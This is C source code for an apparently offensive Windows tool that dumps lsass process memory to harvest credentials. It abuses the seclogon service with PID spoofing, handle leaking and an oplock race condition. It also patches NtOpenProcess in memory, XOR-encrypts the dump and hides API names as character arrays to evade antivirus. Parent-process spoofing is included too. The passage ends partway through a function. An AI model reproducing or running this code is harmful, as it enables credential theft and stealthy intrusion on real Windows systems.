#include "windows.h"
#include "stdio.h"
#include "ntdef.h"
#include <strsafe.h>
#include <DbgHelp.h>

#define MAX_LSASS_DMP_SIZE 314572800
// Buffer for saving the minidump
LPVOID gDumpBuffer = NULL;
DWORD gBytesRead = 0;


void usage();
BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
void EnableDebugPrivilege(BOOL enforceCheck);
BOOL EnableImpersonatePrivilege();
void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid);
void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid);
void FindProcessHandlesInTargetProcess(DWORD lsassPid, HANDLE* handlesToLeak, PDWORD handlesToLeakCount);
void FindTokenHandlesInProcess(DWORD targetPid, HANDLE* tokenHandles, PDWORD tokenHandlesLen);
void MalSeclogonPPIDSpoofing(int lsassPid, wchar_t* cmdline);
void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize);
void RestoreNtOpenProcess(char* oldCode, int oldCodeSize);
void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath);
void MalSeclogonDumpLsassWithSeclogonRaceCondition(int lsassPid, wchar_t* dumpPath, int xorKey);
void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone);
void LeakLsassHandleInSeclogonWithRaceCondition(DWORD lsassPid);
BOOL MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT callbackInput, PMINIDUMP_CALLBACK_OUTPUT callbackOutput);
void EncryptAndWriteDumpToDisk(wchar_t* dumpPath, int xorKey);
void DecryptAndWriteDumpToDisk(wchar_t* encryptedDumpPath, int xorKey);
void CreateFileLock(HANDLE hFile, LPOVERLAPPED overlapped);
DWORD WINAPI ThreadSeclogonLock(LPVOID lpParam);
NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo);
NTSTATUS GetTypeIndexByName(__in PCUNICODE_STRING TypeName, __out PULONG TypeIndex);
BOOL FileExists(LPCTSTR szPath);
DWORD GetLsassPid();
DWORD GetPidUsingFilePath(wchar_t* processBinaryPath);

int wmain(int argc, wchar_t** argv)
{
	int targetPid = -1;
	int xorKey = 40;
	int lsassDumpType = -1;
	BOOL handlesLeaked = FALSE, useLsassClone = FALSE;
	wchar_t defaultDumpPath[] = L"C:\\lsass.dmp";
	wchar_t defaultCmdline[] = L"cmd.exe";
	wchar_t* dumpPath = defaultDumpPath;
	wchar_t* cmdline = defaultCmdline;
	wchar_t* encryptedDumpPath = NULL;

	int cnt = 1;
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{
		switch (argv[cnt][1])
		{
			case 'p':
				++cnt;
				--argc;
				targetPid = _wtoi(argv[cnt]);
				break;

			case 'd':
				++cnt;
				--argc;
				if (argv[cnt] == L'\0') goto DefaultLabel;
				lsassDumpType = _wtoi(argv[cnt]);
				break;

			case 'o':
				++cnt;
				--argc;
				dumpPath = argv[cnt];
				break;

			case 'c':
				++cnt;
				--argc;
				cmdline = argv[cnt];
				break;

			case 'k':
				++cnt;
				--argc;
				xorKey = _wtoi(argv[cnt]);
				break;

			case 'l':
				++cnt;
				--argc;
				handlesLeaked = TRUE;
				break;

			case 'f':
				++cnt;
				--argc;
				encryptedDumpPath = argv[cnt];
				break;

			case 'h':
				usage();
				exit(0);

		DefaultLabel:
			default:
				printf("Wrong Argument: %S\n", argv[cnt]);
				usage();
				exit(-1);
		}
		++cnt;
		--argc;
	}

	if (xorKey < 0 || xorKey > 255) {
		printf("The Xor key must be between 1 and 255.\n");
		exit(-1);
	}

	if (encryptedDumpPath != NULL) {
		DecryptAndWriteDumpToDisk(encryptedDumpPath, xorKey);
		return 0;
	}

	if (targetPid == -1) {
		targetPid = GetLsassPid();
		if(lsassDumpType == -1) lsassDumpType = 3;
	}

	if (lsassDumpType > 1) useLsassClone = TRUE;
	if (lsassDumpType > 0) {
		if (handlesLeaked) {
			MalSeclogonDumpLsassFromLeakedHandles(targetPid, dumpPath, useLsassClone);
		}
		else {
			if (lsassDumpType == 3)
				MalSeclogonDumpLsassWithSeclogonRaceCondition(targetPid, dumpPath, xorKey);
			else
				MalSeclogonLeakHandles(targetPid, dumpPath);
		}
	}
	else {
		MalSeclogonPPIDSpoofing(targetPid, cmdline);
	}
	return 0;
}


BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	PRIVILEGE_SET privs;
	LUID luid;
	BOOL debugPrivEnabled = FALSE;
	if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid))
	{
		printf("LookupPrivilegeValueW() failed, error %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges() failed, error %u\n", GetLastError());
		return FALSE;
	}
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!PrivilegeCheck(hToken, &privs, &debugPrivEnabled)) {
		printf("PrivilegeCheck() failed, error %u\n", GetLastError());
		return FALSE;
	}
	if (!debugPrivEnabled)
		return FALSE;
	return TRUE;
}

void EnableDebugPrivilege(BOOL enforceCheck) {
	HANDLE currentProcessToken = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
	BOOL setPrivilegeSuccess = SetPrivilege(currentProcessToken, L"SeDebugPrivilege", TRUE);
	if (enforceCheck && !setPrivilegeSuccess) {
		printf("SetPrivilege failed to enable SeDebugPrivilege. Run it as an Administrator. Exiting...\n");
		exit(-1);
	}
	CloseHandle(currentProcessToken);
}

BOOL EnableImpersonatePrivilege() {
	HANDLE currentProcessToken = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
	BOOL setPrivilegeSuccess = SetPrivilege(currentProcessToken, L"SeImpersonatePrivilege", TRUE);
	CloseHandle(currentProcessToken);
	return setPrivilegeSuccess;
}
 
void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid) {
	CLIENT_ID CSpoofedPid;
	DWORD oldProtection, oldProtection2;
	*originalPid = GetCurrentProcessId();
	*originalTid = GetCurrentThreadId();
	CLIENT_ID* pointerToTebPid = &(NtCurrentTeb()->ClientId);
	CSpoofedPid.UniqueProcess = (HANDLE)spoofedPid;
	CSpoofedPid.UniqueThread = (HANDLE)*originalTid;
	memcpy(pointerToTebPid, &CSpoofedPid, sizeof(CLIENT_ID));
}

void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid) {
	CLIENT_ID CRealPid;
	DWORD oldProtection, oldProtection2;
	CLIENT_ID* pointerToTebPid = &(NtCurrentTeb()->ClientId);
	CRealPid.UniqueProcess = (HANDLE)originalPid;
	CRealPid.UniqueThread = (HANDLE)originalTid;
	memcpy(pointerToTebPid, &CRealPid, sizeof(CLIENT_ID));
}

NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo) {
	NTSTATUS Status;
	ULONG BufferLength = 0x1000;
	PVOID Buffer;
	pNtQueryObject NtQueryObject = (pNtQueryObject)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryObject");
	*TypesInfo = NULL;
	do {
		Buffer = malloc(BufferLength);
		if (Buffer == NULL)
			return (NTSTATUS)STATUS_INSUFFICIENT_RESOURCES;
		Status = NtQueryObject(NULL, ObjectTypesInformation, Buffer, BufferLength, &BufferLength);
		if (NT_SUCCESS(Status)) {
			*TypesInfo = Buffer;
			return Status;
		}
		free(Buffer);
	} while (Status == STATUS_INFO_LENGTH_MISMATCH);
	return Status;
}

// credits for this goes to @0xrepnz --> https://twitter.com/0xrepnz/status/1401118056294846467
NTSTATUS GetTypeIndexByName(__in PCUNICODE_STRING TypeName, __out PULONG TypeIndex) {
	NTSTATUS Status;
	POBJECT_TYPES_INFORMATION ObjectTypes;
	POBJECT_TYPE_INFORMATION_V2 CurrentType;
	*TypeIndex = 0;
	pRtlCompareUnicodeString RtlCompareUnicodeString = (pRtlCompareUnicodeString)GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlCompareUnicodeString");
	Status = QueryObjectTypesInfo(&ObjectTypes);
	if (!NT_SUCCESS(Status)) {
		printf("QueryObjectTypesInfo failed: 0x%08x\n", Status);
		return Status;
	}
	CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
	for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++) {
		if (RtlCompareUnicodeString(TypeName, &CurrentType->TypeName, TRUE) == 0) {
			*TypeIndex = i + 2;
			break;
		}
		CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
	}
	if (!*TypeIndex)
		Status = STATUS_NOT_FOUND;
	free(ObjectTypes);
	return Status;
}

void FindProcessHandlesInTargetProcess(DWORD targetPid, HANDLE *handlesToLeak, PDWORD handlesToLeakCount) 
{
	PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
	DWORD handleInfoSize = 0x10000;
	NTSTATUS status;
	ULONG processTypeIndex;
	UNICODE_STRING processTypeName = RTL_CONSTANT_STRING(L"Process");
	status = GetTypeIndexByName(&processTypeName, &processTypeIndex);
	if (!NT_SUCCESS(status)) {
		printf("GetTypeIndexByName failed 0x%08x\n", status);
		exit(-1);
	}
	pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	for (DWORD i = 0; i < handleInfo->HandleCount; i++) {
		if (handleInfo->Handles[i].ObjectTypeIndex == processTypeIndex && handleInfo->Handles[i].UniqueProcessId == targetPid) {
			handlesToLeak[*handlesToLeakCount] = (HANDLE)handleInfo->Handles[i].HandleValue;
			*handlesToLeakCount = *handlesToLeakCount + 1;
		}
	}
	free(handleInfo);
}

void FindTokenHandlesInProcess(DWORD targetPid, HANDLE* tokenHandles, PDWORD tokenHandlesLen)
{
	PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
	DWORD handleInfoSize = 0x10000;
	NTSTATUS status;
	ULONG processTypeIndex;
	UNICODE_STRING processTypeName = RTL_CONSTANT_STRING(L"Token");
	status = GetTypeIndexByName(&processTypeName, &processTypeIndex);
	if (!NT_SUCCESS(status)) {
		printf("GetTypeIndexByName failed 0x%08x\n", status);
		exit(-1);
	}
	pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	for (DWORD i = 0; i < handleInfo->HandleCount; i++) {
		if (handleInfo->Handles[i].ObjectTypeIndex == processTypeIndex && handleInfo->Handles[i].UniqueProcessId == targetPid) {
			tokenHandles[*tokenHandlesLen] = (HANDLE)handleInfo->Handles[i].HandleValue;
			*tokenHandlesLen = *tokenHandlesLen + 1;
		}
	}
	free(handleInfo);
}

void MalSeclogonPPIDSpoofing(int pid, wchar_t* cmdline)
{
	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	DWORD originalPid, originalTid;
	HANDLE tokenHandles[8192];
	DWORD tokenHandlesCount = 0;
	BOOL useCreateProcessWithToken = FALSE;
	BOOL processCreatedWithToken = FALSE;
	EnableDebugPrivilege(FALSE);
	SpoofPidTeb((DWORD)pid, &originalPid, &originalTid);
	RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
	RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
	if (EnableImpersonatePrivilege()) {
		FindTokenHandlesInProcess(pid, tokenHandles, &tokenHandlesCount);
		if (tokenHandlesCount < 1) {
			printf("No token handles found in process %d, can't use CreateProcessWithToken(). Reverting to CreateProcessWithLogon()...\n", pid);
			useCreateProcessWithToken = FALSE;
		}
		else
			useCreateProcessWithToken = TRUE;
	}
	else {
		printf("Impersonation privileges not available, can't use CreateProcessWithToken(). Reverting to CreateProcessWithLogon()...\n");
		useCreateProcessWithToken = FALSE;
	}
	if (useCreateProcessWithToken) {
		for (DWORD i = 0; i < tokenHandlesCount; i++) {
			if (CreateProcessWithTokenW(tokenHandles[i], 0, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
				processCreatedWithToken = TRUE;
				break;
			}
		}
		if (processCreatedWithToken) {
			// the returned handles in procInfo are wrong and duped into the spoofed parent process, so we can't close handles or wait for process end.
			printf("Spoofed process %S created correctly as child of PID %d using CreateProcessWithTokenW()!", cmdline, pid);
		}
		else {
			printf("CreateProcessWithTokenW() failed with error code %d \n", GetLastError());
		}
	}
	else {
		if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
			printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
		}
		else {
			// the returned handles in procInfo are wrong and duped into the spoofed parent process, so we can't close handles or wait for process end.
			printf("Spoofed process %S created correctly as child of PID %d using CreateProcessWithLogonW()!", cmdline, pid);
		}
	}
	RestoreOriginalPidTeb(originalPid, originalTid);
}

BOOL FileExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributes(szPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath) {
	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	DWORD originalPid, originalTid;
	wchar_t moduleFilename[MAX_PATH], newCmdline[MAX_PATH];
	wchar_t cmdlineTemplate[] = L"%s %s";
	HANDLE handlesToLeak[8192];
	DWORD handlesToLeakCount = 0;
	DWORD leakedHandlesCounter = 0;
	EnableDebugPrivilege(TRUE);
	FindProcessHandlesInTargetProcess(lsassPid, handlesToLeak, &handlesToLeakCount);
	if (handlesToLeakCount < 1) {
		printf("No process handles to lsass found. The PID you specified does not seem to be the lsass pid.\n");
		exit(-1);
	}
	// hacky thing to respawn the current process with different commandline. This should flag our next execution to contains leaked handles
	StringCchPrintfW(newCmdline, MAX_PATH, cmdlineTemplate, GetCommandLine(), L"-l 1");
	GetModuleFileName(NULL, moduleFilename, MAX_PATH);
	if (FileExists(dumpPath)) DeleteFile(dumpPath);
	SpoofPidTeb((DWORD)lsassPid, &originalPid, &originalTid);
	// we are running in a loop because we can force the seclogon service to duplicate 3 handles at a time. It's not ensured lsass handles are the first 3 leaked handles, so we need to iterate...
	while (leakedHandlesCounter < handlesToLeakCount) {
		RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
		RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
		startInfo.dwFlags = STARTF_USESTDHANDLES;
		startInfo.hStdInput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
		startInfo.hStdOutput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
		startInfo.hStdError = (HANDLE)handlesToLeak[leakedHandlesCounter++];
		printf("Attempt to leak process handles from lsass: 0x%04x 0x%04x 0x%04x...\n", startInfo.hStdInput, startInfo.hStdOutput, startInfo.hStdError);
		if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, moduleFilename, newCmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
			printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
			exit(-1);
		}
		// we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
		HANDLE hSpoofedProcess = OpenProcess(SYNCHRONIZE, FALSE, procInfo.dwProcessId);
		WaitForSingleObject(hSpoofedProcess, INFINITE);
		CloseHandle(hSpoofedProcess);
		if (FileExists(dumpPath)) break;
	}
	RestoreOriginalPidTeb(originalPid, originalTid);
	if (FileExists(dumpPath))
		printf("Lsass dump created with leaked handle! Check the path %S\n", dumpPath);
	else
		printf("Something went wrong :(\n");
}

void MalSeclogonDumpLsassWithSeclogonRaceCondition(int lsassPid, wchar_t* dumpPath, int xorKey) {
	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	DWORD originalPid, originalTid;
	char oldCode[15];
	int oldCodeSize;
	HANDLE handles[8192];
	DWORD handlesCount = 0;
	DWORD seclogonPid = 0;
	HANDLE hSeclogon, hDupedHandle, hLsassClone;
	NTSTATUS status;
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	wchar_t dbgcoreStr[] = { L'd', L'b', L'g', L'c', L'o', L'r', L'e', L'.', L'd', L'l', L'l', 0x00, 0x00 };
	wchar_t ntdllStr[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0x00, 0x00 };
	char MiniDumpWriteDumpStr[] = { 'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0x00 };
	char NtCreateProcessExStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'E', 'x', 0x00 };
	pMiniDumpWriteDump MiniDumpWriteDumpDyn = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(dbgcoreStr), MiniDumpWriteDumpStr);
	pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(LoadLibrary(ntdllStr), NtCreateProcessExStr);
	EnableDebugPrivilege(TRUE);
	seclogonPid = GetPidUsingFilePath(L"\\WINDOWS\\system32\\seclogon.dll");
	if (seclogonPid == 0) {
		printf("Seclogon service not running, trying to wake-up...\n");
		RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
		RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
		CreateProcessWithTokenW(-1, 0, NULL, L"cmd", 0, NULL, NULL, &startInfo, &procInfo);
		// trying again to get the seclogon pid
		seclogonPid = GetPidUsingFilePath(L"\\WINDOWS\\system32\\seclogon.dll");
	}
	SpoofPidTeb((DWORD)lsassPid, &originalPid, &originalTid);
	LeakLsassHandleInSeclogonWithRaceCondition((DWORD)lsassPid);
	RestoreOriginalPidTeb(originalPid, originalTid);
	FindProcessHandlesInTargetProcess(seclogonPid, handles, &handlesCount);
	if (handlesCount < 1) {
		printf("No process handles found in seclogon. The race condition didn't work.\n");
		exit(-1);
	}
	if (FileExists(dumpPath)) DeleteFile(dumpPath);
	hSeclogon = OpenProcess(PROCESS_DUP_HANDLE, FALSE, seclogonPid);
	for (DWORD i = 0; i < handlesCount; i++) {
		DuplicateHandle(hSeclogon, handles[i], GetCurrentProcess(), &hDupedHandle, 0, FALSE, DUPLICATE_SAME_ACCESS);
		if (GetProcessId(hDupedHandle) == lsassPid) {
			status = NtCreateProcessEx(&hLsassClone, MAXIMUM_ALLOWED, NULL, hDupedHandle, 0x1001, NULL, NULL, NULL, FALSE);
			if (status != 0) {
				printf("NtCreateProcessEx failed with ntstatus 0x%08x", status);
				exit(-1);
			}
			// Set up minidump callback
			RtlZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
			callbackInfo.CallbackRoutine = &MinidumpCallbackRoutine;
			callbackInfo.CallbackParam = NULL;
			// init global vars for storing dump in memory
			gDumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_LSASS_DMP_SIZE);
			gBytesRead = 0;
			// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() called from MiniDumpWriteDump() try to close it
			SetHandleInformation(hLsassClone, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
			// we need to patch NtOpenProcess because MiniDumpWriteDump() would open a new handle to lsass and we want to avoid that
			ReplaceNtOpenProcess((HANDLE)hLsassClone, oldCode, &oldCodeSize);
			BOOL result = MiniDumpWriteDumpDyn((HANDLE)hLsassClone, GetProcessId(hLsassClone), NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
			if (!result) {
				printf("MiniDumpWriteDump failed with error code %d\n", GetLastError());
				exit(-1);
			}
			RestoreNtOpenProcess(oldCode, oldCodeSize);
			// unprotect the handle for close
			SetHandleInformation(hLsassClone, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
			EncryptAndWriteDumpToDisk(dumpPath, xorKey);
			HeapFree(GetProcessHeap(), 0, gDumpBuffer);
			gDumpBuffer = NULL;
			CloseHandle(hLsassClone);
			break;
		}
		CloseHandle(hDupedHandle);
	}
	CloseHandle(hSeclogon);
}

// credits to --> https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
// MiniDumpWriteDump routine to store the lsass dump in memory and allowing to write the encrypted dump to the disk
BOOL MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT callbackInput, PMINIDUMP_CALLBACK_OUTPUT callbackOutput) {
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
		case IoStartCallback:
			callbackOutput->Status = S_FALSE;
			break;

			// Gets called for each lsass process memory read operation
		case IoWriteAllCallback:
			callbackOutput->Status = S_OK;

			// A chunk of minidump data that's been jus read from lsass. 
			// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
			// We will simply save it to dumpBuffer.
			source = callbackInput->Io.Buffer;

			// Calculate location of where we want to store this part of the dump.
			// Destination is start of our dumpBuffer + the offset of the minidump data
			destination = (LPVOID)((DWORD_PTR)gDumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

			// Size of the chunk of minidump that's just been read.
			bufferSize = callbackInput->Io.BufferBytes;
			gBytesRead += bufferSize;

			RtlCopyMemory(destination, source, bufferSize);

			//printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
			break;

		case IoFinishCallback:
			callbackOutput->Status = S_OK;
			break;

		default:
			return TRUE;
	}
	return TRUE;
}

void EncryptAndWriteDumpToDisk(wchar_t* dumpPath, int xorKey) {
	HANDLE hDumpFileEncrypted;
	DWORD bytesRead, bytesWritten;
	char* readBuffer = gDumpBuffer;
	bytesRead = gBytesRead;
	for (DWORD i = 0; i < bytesRead; i++)
		readBuffer[i] = readBuffer[i] ^ (char)xorKey;
	hDumpFileEncrypted = CreateFile(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDumpFileEncrypted == INVALID_HANDLE_VALUE) {
		printf("Cannot create file %S. Exiting...\n", dumpPath);
		exit(1);
	}
	WriteFile(hDumpFileEncrypted, readBuffer, bytesRead, &bytesWritten, NULL);
	CloseHandle(hDumpFileEncrypted);
	if (FileExists(dumpPath)) {
		printf("Lsass dump created with lsass handle stolen from seclogon! Check the path %S\n", dumpPath);
		printf("The dump has been created in an encrypted form with the xor key %d. Remember to decrypt it with -f flag before parsing it.\n", xorKey);
	}
	else
		printf("Something went wrong :(\n");
}

void DecryptAndWriteDumpToDisk(wchar_t* encryptedDumpPath, int xorKey) {
	HANDLE hDumpFileEncrypted;
	DWORD bytesRead, bytesWritten;
	char* readBuffer = malloc(MAX_LSASS_DMP_SIZE);
	hDumpFileEncrypted = CreateFile(encryptedDumpPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDumpFileEncrypted == INVALID_HANDLE_VALUE) {
		printf("Cannot open file %S. Exiting...\n", encryptedDumpPath);
		exit(1);
	}
	ReadFile(hDumpFileEncrypted, readBuffer, MAX_LSASS_DMP_SIZE, &bytesRead, NULL);
	for (DWORD i = 0; i < bytesRead; i++)
		readBuffer[i] = readBuffer[i] ^ (char)xorKey;
	if (readBuffer[0] == 'M' && readBuffer[1] == 'D' && readBuffer[2] == 'M' && readBuffer[3] == 'P') {
		SetFilePointer(hDumpFileEncrypted, 0, 0, FILE_BEGIN);
		if (WriteFile(hDumpFileEncrypted, readBuffer, bytesRead, &bytesWritten, NULL))
			printf("Lsass dump decrypted succesfully. Now you can parse it correctly. Decrypted dump path: %S\n", encryptedDumpPath);
		else
			printf("Cannot decrypt dump file %S\n", encryptedDumpPath);
	}
	else {
		printf("Cannot decrypt dump file %S. Wrong XOR key...\n", encryptedDumpPath);
	}
	CloseHandle(hDumpFileEncrypted);
	free(readBuffer);
}

// credits to @tirannido
// took from --> https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CommonUtils/FileOpLock.cpp
void CreateFileLock(HANDLE hFile, LPOVERLAPPED overlapped) {
	REQUEST_OPLOCK_INPUT_BUFFER inputBuffer;
	REQUEST_OPLOCK_OUTPUT_BUFFER outputBuffer;
	inputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
	inputBuffer.StructureLength = sizeof(inputBuffer);
	inputBuffer.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
	inputBuffer.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;
	outputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
	outputBuffer.StructureLength = sizeof(outputBuffer);
	DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK, &inputBuffer, sizeof(inputBuffer), &outputBuffer, sizeof(outputBuffer), NULL, overlapped);
	DWORD err = GetLastError();
	if (err != ERROR_IO_PENDING) {
		printf("Oplock Failed %d\n", err);
		exit(-1);
	}
}

DWORD WINAPI ThreadSeclogonLock(LPVOID lpParam) {
	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)lpParam;
	MalSeclogonPPIDSpoofing(thread_params->pid, thread_params->cmdline);
	return 0;
}

void LeakLsassHandleInSeclogonWithRaceCondition(DWORD lsassPid) {
	wchar_t fileToLock[] = L"\\Windows\\System32\\license.rtf";
	OVERLAPPED overlapped;
	DWORD dwBytes;
	THREAD_PARAMETERS thread_params;
	HANDLE hFile = CreateFile(fileToLock, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	overlapped.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	CreateFileLock(hFile, &overlapped);
	thread_params.pid = lsassPid;
	thread_params.cmdline = fileToLock;
	// we need to run CreateProcessWithToken() in a separate thread because the file lock would also lock our thread
	CreateThread(NULL, 0, ThreadSeclogonLock, (LPVOID)&thread_params, 0, NULL);
	// this call will halt the current thread until someone will access the locked file. We expect seclogon trying to access license.rtf when calling CreateProcessAsUser()
	if (!GetOverlappedResult(hFile, &overlapped, &dwBytes, TRUE)) {
		printf("Oplock Failed. Exiting...\n");
		exit(-1);
	}
	printf("Seclogon thread locked. A lsass handle will be available inside the seclogon process!\n");
}


// this is very dirty, minimal effort code to replace NtOpenProcess. We return the leaked lsass handle instead of opening a new handle
void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize) {
	/*
		mov QWORD [rcx], 0xffff
		xor rax, rax
		ret
	*/
	char replacedFunc[] = { 0x48, 0xC7, 0x01, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x31, 0xC0, 0xC3 };
	DWORD oldProtection, oldProtection2;
	char* addrNtOpenProcess = (char*)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
	// we save old code to restore the original function
	*oldCodeSize = sizeof(replacedFunc);
	memcpy(oldCode, addrNtOpenProcess, *oldCodeSize);
	memcpy((replacedFunc + 3), (WORD*)&leakedHandle, sizeof(WORD));
	VirtualProtect(addrNtOpenProcess, sizeof(replacedFunc), PAGE_EXECUTE_READWRITE, &oldProtection);
	memcpy(addrNtOpenProcess, replacedFunc, sizeof(replacedFunc));
	VirtualProtect(addrNtOpenProcess, sizeof(replacedFunc), oldProtection, &oldProtection2);
}

void RestoreNtOpenProcess(char* oldCode, int oldCodeSize) {
	DWORD oldProtection, oldProtection2;
	char* addrNtOpenProcess = (char*)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
	VirtualProtect(addrNtOpenProcess, oldCodeSize, PAGE_EXECUTE_READWRITE, &oldProtection);
	memcpy(addrNtOpenProcess, oldCode, oldCodeSize);
	VirtualProtect(addrNtOpenProcess, oldCodeSize, oldProtection, &oldProtection2);
}

void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone) {
	wchar_t dbgcoreStr[] = {L'd', L'b', L'g', L'c', L'o', L'r', L'e', L'.', L'd', L'l', L'l', 0x00, 0x00};
